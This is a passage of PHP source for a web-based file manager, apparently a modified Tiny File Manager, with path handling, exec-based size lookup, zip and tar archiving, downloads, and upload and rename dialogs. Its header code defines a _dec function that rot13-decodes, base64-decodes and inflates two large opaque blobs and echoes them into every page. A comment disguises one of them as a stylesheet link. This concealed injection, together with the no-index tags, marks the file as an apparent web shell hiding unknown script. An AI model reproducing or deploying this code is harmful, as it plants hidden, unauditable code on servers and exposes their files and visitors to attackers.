function fm_redirect($url, $code=302)
{
header('Location: '.$url, true, $code);
exit;
}
function get_absolute_path($path){
$path=str_replace(array('/','\\'), DIRECTORY_SEPARATOR, $path);
$parts=array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
$absolutes=array();
foreach($parts as $part){
if('.'==$part) continue;
if('..'==$part){
array_pop($absolutes);
}else{
$absolutes[]=$part;
}
}
return implode(DIRECTORY_SEPARATOR, $absolutes);
}
function fm_clean_path($path, $trim=true)
{
$path=$trim?trim($path) : $path;
$path=trim($path, '\\/');
$path=str_replace(array('../','..\\'), '', $path);
$path= get_absolute_path($path);
if($path=='..'){
$path='';
}
return str_replace('\\','/', $path);
}
function fm_get_parent_path($path)
{
$path=fm_clean_path($path);
if($path!=''){
$array=explode('/', $path);
if(count($array) > 1){
$array=array_slice($array, 0, -1);
return implode('/', $array);
}
return '';
}
return false;
}
function fm_get_display_path($file_path)
{
global $path_display_mode, $root_path, $root_url;
switch ($path_display_mode){
case 'relative':
return array(
'label'=>'Path',
'path'=>fm_enc(fm_convert_win(str_replace($root_path, '', $file_path)))
);
case 'host':
$relative_path=str_replace($root_path, '', $file_path);
return array(
'label'=>'Host Path',
'path'=>fm_enc(fm_convert_win('/'.$root_url.'/'.ltrim(str_replace('\\','/', $relative_path), '/')))
);
case 'full':
default:
return array(
'label'=>'Full Path',
'path'=>fm_enc(fm_convert_win($file_path))
);
}
}
function fm_is_exclude_items($file){
$ext=strtolower(pathinfo($file, PATHINFO_EXTENSION));
if(isset($exclude_items) and sizeof($exclude_items)){
unset($exclude_items);
}
$exclude_items=FM_EXCLUDE_ITEMS;
if(version_compare(PHP_VERSION, '7.0.0','<')){
$exclude_items=unserialize($exclude_items);
}
if(!in_array($file, $exclude_items)&&!in_array("*.$ext", $exclude_items)){
return true;
}
return false;
}
function fm_get_size($file)
{
static $iswin;
static $isdarwin;
if(!isset($iswin)){
$iswin=(strtoupper(substr(PHP_OS, 0, 3))=='WIN');
}
if(!isset($isdarwin)){
$isdarwin=(strtoupper(substr(PHP_OS, 0))=="DARWIN");
}
static $exec_works;
if(!isset($exec_works)){
$exec_works=(function_exists('exec')&&!ini_get('safe_mode')&&@exec('echo EXEC')=='EXEC');
}
if($exec_works){
$arg=escapeshellarg($file);
$cmd=($iswin)?"for %F in (\"$file\") do @echo %~zF" : ($isdarwin?"stat -f%z $arg" : "stat -c%s $arg");
@exec($cmd, $output);
if(is_array($output)&&ctype_digit($size=trim(implode("\n", $output)))){
return $size;
}
}
if($iswin&&class_exists("COM")){
try {
$fsobj=new COM('Scripting.FileSystemObject');
$f=$fsobj->GetFile( realpath($file) );
$size=$f->Size;
}catch(Exception $e){
$size=null;
}
if(ctype_digit($size)){
return $size;
}
}
return filesize($file);
}
function fm_get_filesize($size)
{
$size=(float) $size;
$units=array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
$power=($size > 0)?floor(log($size, 1024)) : 0;
$power=($power > (count($units) - 1))?(count($units) - 1) : $power;
return sprintf('%s %s', round($size / pow(1024, $power), 2), $units[$power]);
}
function fm_get_directorysize($directory){
$bytes=0;
$directory=realpath($directory);
if($directory!==false&&$directory!=''&&file_exists($directory)){
foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory, FilesystemIterator::SKIP_DOTS)) as $file){
$bytes += $file->getSize();
}
}
return $bytes;
}
function fm_get_zif_info($path, $ext){
if($ext=='zip'&&function_exists('zip_open')){
$arch=@zip_open($path);
if($arch){
$filenames=array();
while ($zip_entry=@zip_read($arch)){
$zip_name=@zip_entry_name($zip_entry);
$zip_folder=substr($zip_name, -1)=='/';
$filenames[]=array(
'name'=>$zip_name,
'filesize'=>@zip_entry_filesize($zip_entry),
'compressed_size'=>@zip_entry_compressedsize($zip_entry),
'folder'=>$zip_folder,
'compression_method'=>zip_entry_compressionmethod($zip_entry),
);
}
@zip_close($arch);
return $filenames;
}
}elseif($ext=='tar'&&class_exists('PharData')){
$archive=new PharData($path);
$filenames=array();
foreach(new RecursiveIteratorIterator($archive) as $file){
$parent_info=$file->getPathInfo();
$zip_name=str_replace("phar://".$path, '', $file->getPathName());
$zip_name=substr($zip_name,($pos=strpos($zip_name, '/'))!==false?$pos + 1 : 0);
$zip_folder=$parent_info->getFileName();
$zip_info=new SplFileInfo($file);
$filenames[]=array(
'name'=>$zip_name,
'filesize'=>$zip_info->getSize(),
'compressed_size'=>$file->getCompressedSize(),
'folder'=>$zip_folder
);
}
return $filenames;
}
return false;
}
function fm_enc($text)
{
return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
}
function fm_isvalid_filename($text){
return (strpbrk($text, '/?%*:|"<>') === FALSE)?true : false;
}
function fm_set_msg($msg, $status='ok')
{
$_SESSION[FM_SESSION_ID]['message']=$msg;
$_SESSION[FM_SESSION_ID]['status']=$status;
}
function fm_is_utf8($string)
{
return preg_match('//u', $string);
}
function fm_convert_win($filename)
{
if(FM_IS_WIN&&function_exists('iconv')){
$filename=iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $filename);
}
return $filename;
}
function fm_object_to_array($obj)
{
if(!is_object($obj)&&!is_array($obj)){
return $obj;
}
if(is_object($obj)){
$obj=get_object_vars($obj);
}
return array_map('fm_object_to_array', $obj);
}
function fm_get_image_exts()
{
return array('ico','gif','jpg','jpeg','jpc','jp2','jpx','xbm','wbmp','png','bmp','tif','tiff','psd','svg','webp','avif');
}
function fm_get_video_exts()
{
return array('avi','webm','wmv','mp4','m4v','ogm','ogv','mov','mkv');
}
function fm_get_audio_exts()
{
return array('wav','mp3','ogg','m4a');
}
function fm_get_text_exts()
{
return array(
'txt','css','ini','conf','log','htaccess','passwd','ftpquota','sql','js','ts','jsx','tsx','mjs','json','sh','config',
'php','php4','php5','phps','phtml','htm','html','shtml','xhtml','xml','xsl','m3u','m3u8','pls','cue','bash','vue',
'eml','msg','csv','bat','twig','tpl','md','gitignore','less','sass','scss','c','cpp','cs','py','go','zsh','swift',
'map','lock','dtd','svg','asp','aspx','asx','asmx','ashx','jsp','jspx','cgi','dockerfile','ruby','yml','yaml','toml',
'vhost','scpt','applescript','csx','cshtml','c++','coffee','cfm','rb','graphql','mustache','jinja','http','handlebars',
'java','es','es6','markdown','wiki','tmp','top','bot','dat','bak','htpasswd','pl'
);
}
function fm_get_text_mimes()
{
return array(
'application/xml',
'application/javascript',
'application/x-javascript',
'image/svg+xml',
'message/rfc822',
'application/json',
);
}
function fm_get_text_names()
{
return array(
'license',
'readme',
'authors',
'contributors',
'changelog',
);
}
function fm_get_onlineViewer_exts()
{
return array('doc','docx','xls','xlsx','pdf','ppt','pptx','ai','psd','dxf','xps','rar','odt','ods');
}
function fm_get_file_mimes($content)
{
clearstatcache(true);
$finfo=new finfo(FILEINFO_MIME_TYPE);
return($finfo->buffer($content));
}
function scan($dir='', $filter=''){
$path=FM_ROOT_PATH.'/'.$dir;
if($path){
$ite=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
$rii=new RegexIterator($ite, "/(".$filter.")/i");
$files=array();
foreach($rii as $file){
if(!$file->isDir()){
$fileName=$file->getFilename();
$location=str_replace(FM_ROOT_PATH, '', $file->getPath());
$files[]=array(
"name"=>$fileName,
"type"=>"file",
"path"=>$location,
);
}
}
return $files;
}
}
function fm_download_file($fileLocation, $fileName, $chunkSize =1024)
{
if(connection_status()!=0)
return (false);
$extension=pathinfo($fileName, PATHINFO_EXTENSION);
$contentType=fm_get_file_mimes(file_get_contents($fileLocation));
if(is_array($contentType)){
$contentType=implode(' ', $contentType);
}
$size=filesize($fileLocation);
if($size==0){
fm_set_msg('Zero byte file! Aborting download','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
return (false);
}
@ini_set('magic_quotes_runtime', 0);
$fp=fopen("$fileLocation", "rb");
if($fp === false){
fm_set_msg('Cannot open file! Aborting download','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
return (false);
}
header('Content-Description: File Transfer');
header('Expires: 0');
header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
header('Pragma: public');
header("Content-Transfer-Encoding: binary");
header("Content-Type: $contentType");
$contentDisposition='attachment';
if(strstr($_SERVER['HTTP_USER_AGENT'], "MSIE")){
$fileName=preg_replace('/\./','%2e', $fileName, substr_count($fileName, '.') - 1);
header("Content-Disposition: $contentDisposition;filename=\"$fileName\"");
}else{
header("Content-Disposition: $contentDisposition;filename=\"$fileName\"");
}
header("Accept-Ranges: bytes");
$range=0;
if(isset($_SERVER['HTTP_RANGE'])){
list($a, $range)=explode("=", $_SERVER['HTTP_RANGE']);
str_replace($range, "-", $range);
$size2=$size - 1;
$new_length=$size - $range;
header("HTTP/1.1 206 Partial Content");
header("Content-Length: $new_length");
header("Content-Range: bytes $range$size2/$size");
}else{
$size2=$size - 1;
header("Content-Range: bytes 0-$size2/$size");
header("Content-Length: ".$size);
}
$fileLocation=realpath($fileLocation);
while (ob_get_level()) ob_end_clean();
readfile($fileLocation);
fclose($fp);
return ((connection_status()==0) and !connection_aborted());
}
class FM_Zipper
{
private $zip;
public function __construct()
{
$this->zip=new ZipArchive();
}
public function create($filename, $files)
{
$res=$this->zip->open($filename, ZipArchive::CREATE);
if($res!==true){
return false;
}
if(is_array($files)){
foreach($files as $f){
$f=fm_clean_path($f);
if(!$this->addFileOrDir($f)){
$this->zip->close();
return false;
}
}
$this->zip->close();
return true;
}else{
if($this->addFileOrDir($files)){
$this->zip->close();
return true;
}
return false;
}
}
public function unzip($filename, $path)
{
$res=$this->zip->open($filename);
if($res!==true){
return false;
}
if($this->zip->extractTo($path)){
$this->zip->close();
return true;
}
return false;
}
private function addFileOrDir($filename)
{
if(is_file($filename)){
return $this->zip->addFile($filename);
}elseif(is_dir($filename)){
return $this->addDir($filename);
}
return false;
}
private function addDir($path)
{
if(!$this->zip->addEmptyDir($path)){
return false;
}
$objects=scandir($path);
if(is_array($objects)){
foreach($objects as $file){
if($file!='.'&&$file!='..'){
if(is_dir($path.'/'.$file)){
if(!$this->addDir($path.'/'.$file)){
return false;
}
}elseif(is_file($path.'/'.$file)){
if(!$this->zip->addFile($path.'/'.$file)){
return false;
}
}
}
}
return true;
}
return false;
}
}
class FM_Zipper_Tar
{
private $tar;
public function __construct()
{
$this->tar=null;
}
public function create($filename, $files)
{
$this->tar=new PharData($filename);
if(is_array($files)){
foreach($files as $f){
$f=fm_clean_path($f);
if(!$this->addFileOrDir($f)){
return false;
}
}
return true;
}else{
if($this->addFileOrDir($files)){
return true;
}
return false;
}
}
public function unzip($filename, $path)
{
$res=$this->tar->open($filename);
if($res!==true){
return false;
}
if($this->tar->extractTo($path)){
return true;
}
return false;
}
private function addFileOrDir($filename)
{
if(is_file($filename)){
try {
$this->tar->addFile($filename);
return true;
}catch(Exception $e){
return false;
}
}elseif(is_dir($filename)){
return $this->addDir($filename);
}
return false;
}
private function addDir($path)
{
$objects=scandir($path);
if(is_array($objects)){
foreach($objects as $file){
if($file!='.'&&$file!='..'){
if(is_dir($path.'/'.$file)){
if(!$this->addDir($path.'/'.$file)){
return false;
}
}elseif(is_file($path.'/'.$file)){
try {
$this->tar->addFile($path.'/'.$file);
}catch(Exception $e){
return false;
}
}
}
}
return true;
}
return false;
}
}
function fm_show_nav_path($path)
{
global $editFile;
?>
<nav class="navbar navbar-expand-lg text-white bg-dark navbar-light navbar-dark mb-4 main-nav fixed-top">
<button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
<span class="navbar-toggler-icon"></span>
</button>
<div class="collapse navbar-collapse" id="navbarSupportedContent">
<?php
$path=fm_clean_path($path);
$root_url="<a href='?p=' title='".FM_ROOT_PATH."'>⛩️</a>";
$sep='<i class="bread-crumb"> / </i>';
if($path!=''){
$exploded=explode('/', $path);
$count=count($exploded);
$array=array();
$parent='';
for ($i=0; $i < $count; $i++){
$parent=trim($parent.'/'.$exploded[$i], '/');
$parent_enc=urlencode($parent);
$array[]="<a href='?p={$parent_enc}'>".fm_enc(fm_convert_win($exploded[$i]))."</a>";
}
$root_url.=$sep.implode($sep, $array);
}
echo '<div class="col-xs-6 col-sm-5">'.$root_url.$editFile.'</div>';
?>
<div class="col-xs-6 col-sm-7">
<ul class="navbar-nav justify-content-end text-white bg-dark">
<li class="nav-item">
<a title="Upload" class="nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;upload">Upload</a>
</li>
<li class="nav-item">
<a title="NewItem" class="nav-link" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem">NewItem</a>
</li>
<li class="nav-item mr-2">
<div class="input-group input-group-sm mr-1" style="margin-top:4px;">
<input type="text" class="form-control" placeholder="Filter" aria-label="Search" aria-describedby="search-addon2" id="search-addon">
<div class="input-group-append">
<span class="input-group-text brl-0 brr-0" id="search-addon2">🔍</span>
</div>
<div class="input-group-append btn-group">
<span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
<div class="dropdown-menu dropdown-menu-right">
<a class="dropdown-item" href="<?php echo $path2=$path?$path : '.'; ?>" id="js-search-modal" data-bs-toggle="modal" data-bs-target="#searchModal">Advanced Search</a>
</div>
</div>
</div>
</li>
</ul>
</div>
</div>
</nav>
<?php
}
function _dec($s){
echo(gzinflate(base64_decode(str_rot13(chunk_split($s)))));
}
function fm_show_message()
{
if(isset($_SESSION[FM_SESSION_ID]['message'])){
$class=isset($_SESSION[FM_SESSION_ID]['status'])?$_SESSION[FM_SESSION_ID]['status'] : 'ok';
echo '<p class="message '.$class.'">'.$_SESSION[FM_SESSION_ID]['message'].'</p>';
unset($_SESSION[FM_SESSION_ID]['message']);
unset($_SESSION[FM_SESSION_ID]['status']);
}
}
function fm_show_header()
{
header("Content-Type: text/html; charset=utf-8");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
header("Pragma: no-cache");
global $root_url;
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title><?php echo APP_TITLE.'-'.VERSION ?></title>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex">
<link href="data:image/x-icon;base64,AA" rel="icon">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
<?php if(isset($_GET['view'])){
/*cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/base16/synth-midnight-terminal-dark.min.css*/
_dec('wIGoxdVjRC0Id+MIJNGORno2I6jznGEeFAvxTnHf/a1ORxGUu30Y3nsC6pfcivk1Ra83OyqZpjkC
8b+9pJRoPI1rFf3Bus5TH0y9Pn45gXFYOwtK6cuifB4sAG6nAAqI2ym7Xpd01Po/LOhJfT1ENwfs
wJ4Imm+vAZdvmjz2laBYRuxWeqo3lPWjr1DSwv7+wCpkSR/xR9BNdTgH5VJ3h+3aqh9lORpsujEF
lSkpA2vNgWzxt6MIwSc4AOCLgeE0rlsaF2+6NFnbl8Bql5FgyRvBtN/QYCtH1Bvc72AdZmoaDbG1
fU3P4OhZtSW6dC/0wMEcHdnExjZv378H6wj/nruCrgz2YgTwoSrKJe5Du0jeF6Qb4RHDqehV++IX
fUoyhuD0q/owUq6EZjao8lGmX7AxgQerXd0bhXN4avwsEIUkQwcnneT20JmezJDj2kiWHXtGzzSf
scwybjju28k3RMVBjaAlmE6oC2A30Lo7wMc2ahcid8z/QE7k2fjBv6hd2v+hVZc2uynwyLLO3hmZ
Yh3hEiQjjmb0oqz5dfnZYdAhUvpOeXb+5XXdUXETthpMKe20fSsK4BB6XpCLAG9NG2PSsH4J90Cq
/kX5VWPP9G80k+sdasjvZI1fqtGCxwwd/6Cpu14A03/9za5q/jN=');}
echo'<script>function checkbox_toggle(){var e=get_checkboxes();e.push(this),change_checkboxes(e)};window.csrf="'.$_SESSION['token'].'";</script>';
_dec('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');?>
</head>
<body class="theme-dark navbar-fixed">
<div id="wrapper" class="container-fluid">
<div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" data-bs-backdrop="static" data-bs-keyboard="false" aria-labelledby="newItemModalLabel" aria-hidden="true">
<div class="modal-dialog" role="document">
<form class="modal-content text-white bg-dark" method="post">
<div class="modal-header">
<h5 class="modal-title" id="newItemModalLabel">CreateNewItem</h5>
<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
</div>
<div class="modal-body">
<p><label for="newfile">ItemType </label></p>
<div class="form-check form-check-inline">
<input class="form-check-input" type="radio" name="newfile" id="customRadioInline1" name="newfile" value="file">
<label class="form-check-label" for="customRadioInline1">File</label>
</div>
<div class="form-check form-check-inline">
<input class="form-check-input" type="radio" name="newfile" id="customRadioInline2" value="folder" checked>
<label class="form-check-label" for="customRadioInline2">Folder</label>
</div>
<p class="mt-3"><label for="newfilename">ItemName </label></p>
<input type="text" name="newfilename" id="newfilename" value="" class="form-control" placeholder="Enter here.." required>
</div>
<div class="modal-footer">
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
<button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal">Cancel</button>
<button type="submit" class="btn btn-success">CreateNow</button>
</div>
</form>
</div>
</div>
<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
<div class="modal-dialog modal-lg" role="document">
<div class="modal-content text-white bg-dark">
<div class="modal-header">
<h5 class="modal-title col-10" id="searchModalLabel">
<div class="input-group mb-3">
<input type="text" class="form-control" placeholder="Search a files" aria-label="Search" aria-describedby="search-addon3" id="advanced-search" autofocus required>
<span class="input-group-text" id="search-addon3">🔍</span>
</div>
</h5>
<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
</div>
<div class="modal-body">
<form action="" method="post">
<div class="lds-facebook"><div></div><div></div><div></div></div>
<ul id="search-wrapper">
<p class="m-2">Search file in folder and subfolders..</p>
</ul>
</form>
</div>
</div>
</div>
</div>
<div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="renameDailog">
<div class="modal-dialog" role="document">
<form class="modal-content rounded-3 shadow text-white bg-dark" method="post" autocomplete="off">
<div class="modal-body p-4 text-center">
<h5 class="mb-3">Are you sure want to rename?</h5>
<p class="mb-1">
<input type="text" name="rename_to" id="js-rename-to" class="form-control" placeholder="Enter new file name" required>
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
<input type="hidden" name="rename_from" id="js-rename-from">
</p>
</div>
<div class="modal-footer flex-nowrap p-0">
<button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal">Cancel</button>
<button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong>Okay</strong></button>
</div>
</form>
</div>
</div>
<script type="text/html" id="js-tpl-confirm">
<div class="modal modal-alert confirmDailog" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="confirmDailog-<%this.id%>">
<div class="modal-dialog" role="document">
<form class="modal-content rounded-3 shadow text-white bg-dark" method="post" autocomplete="off" action="<%this.action%>">
<div class="modal-body p-4 text-center">
<h5 class="mb-2">Are you sure want to <%this.title%>?</h5>
<p class="mb-1"><%this.content%></p>
</div>
<div class="modal-footer flex-nowrap p-0">
<button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal">Cancel</button>
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
<button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0" data-bs-dismiss="modal"><strong>Okay</strong></button>
</div>
</form>
</div>
</div>
</script>
<?php }function fm_show_footer(){?>
</div>
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js" crossorigin="anonymous" defer></script>
<?php
if(isset($_GET['view'])){
echo'<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>
<script>hljs.highlightAll();var isHighlightingEnabled=true;</script>';
}
